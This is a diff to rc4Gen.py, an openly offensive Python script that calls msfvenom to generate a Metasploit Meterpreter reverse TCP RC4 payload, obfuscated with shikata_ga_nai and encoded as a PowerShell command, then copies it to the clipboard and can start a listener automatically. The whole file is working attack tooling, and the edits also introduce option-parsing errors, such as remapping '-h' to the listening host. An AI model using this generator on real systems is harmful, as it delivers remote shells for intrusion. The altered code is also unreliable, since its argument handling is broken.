@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# Description: Generates a Metasploit Reverse TCP RC4 payload encoded in Powershell.
+# Description: Generates a MSF Reverse TCP RC4 payload encoded in Powershell to the clipboard.
 # Created by: Nick Sanzotta / @beamr
 # Version: rc4Gen.py v 1.0
 import getopt, os, sys, pyperclip, socket
@@ -22,7 +22,7 @@ def get_internal_address():
 	return s.getsockname()[0]
 
 def payloadGenerator(msfPayload,lhost,lport,rc4Password, verboseChoice):
-	#Add try expect statment for the msfpro issue
+	#Add try expect statment for the msfpro alternate path
 	rc4 = os.system('msfvenom -p windows/meterpreter/'+msfPayload+ ' -e x86/shikata_ga_nai RC4PASSWORD='+rc4Password+' LHOST='+lhost+' LPORT='+lport+' -f psh-cmd -o ' +filePowershell)
 	with open(filePowershell, 'r+') as f1:
 		rc4Payload = f1.read()
@@ -80,6 +80,7 @@ def main(argv):
     rc4Password = 'rc4M4g1c'
     msfPayload = 'reverse_tcp_rc4'
     verboseChoice = 'off'
+    msflistenerChoice = 'on'
     if not os.path.exists("/opt/rc4Gen/"):
         os.mkdir("/opt/rc4Gen/") 
 
@@ -99,21 +100,28 @@ def main(argv):
     	rc4Password = raw_input('Enter RC4PASSWORD for payload'+'['+rc4Password+']:') or rc4Password
     	print('ENTERED: "%s"' % rc4Password + '\n')
     	
-    	print('Verbosity [ON] will print payload to STDOUT.')
-    	print('Verbosity [OFF] will copy payload to Clipboard.')
+    	print('TIP: Verbosity [ON] will print payload to STDOUT.')
+    	print('TIP: Verbosity [OFF] will copy payload to Clipboard.')
     	verbose = raw_input('Verbosity[OFF]:') or 'OFF'
     	verboseChoice = verbose.lower()
     	print('ENTERED: "%s"' % verboseChoice.upper() + '\n')
     	payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
+
+    	print('TIP: Listener [ON] will automagically launch a MSF listener.')
+    	msfListener = raw_input('listener[ON]:') or 'ON'
+    	msfListenerChoice = msfListener.lower()
+    	print('ENTERED: "%s"' % msfListenerChoice.upper() + '\n')
+    	listener(msfPayload,lhost,lport,rc4Password)
+
     else:
     	try:
-        	opts, args = getopt.getopt(argv, 'l:p:r:v:e:h',['lhost=','lport=','rc4Password=','verbose=','execute=','help'])
+        	opts, args = getopt.getopt(argv, 'l:p:r:v:e:h',['lhost=','lport=','rc4Password=','verbose=','listener=','help'])
             #GETOPT Menu: 
         	for opt, arg in opts:
-        		if opt in ('-h', '--help'):
+        		if opt in ('--help'):
         			help()
         			sys.exit(2)
-        		elif opt in ('-l', '--lhost'):
+        		elif opt in ('-h', '--lhost'):
         			lhost = arg
         		elif opt in ('-p', '--lport'):
         			lport = arg
@@ -122,8 +130,8 @@ def main(argv):
         		elif opt in ('-v', '--verbose'):
         			verboseChoice = arg
         		#Executes listener
-        		elif opt in ('-e','--execute'): 
-        			if arg == "true":
+        		elif opt in ('-e','--listener'): 
+        			if arg == "on":
         				payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
         				listener(msfPayload,lhost,lport,rc4Password)
         		else:
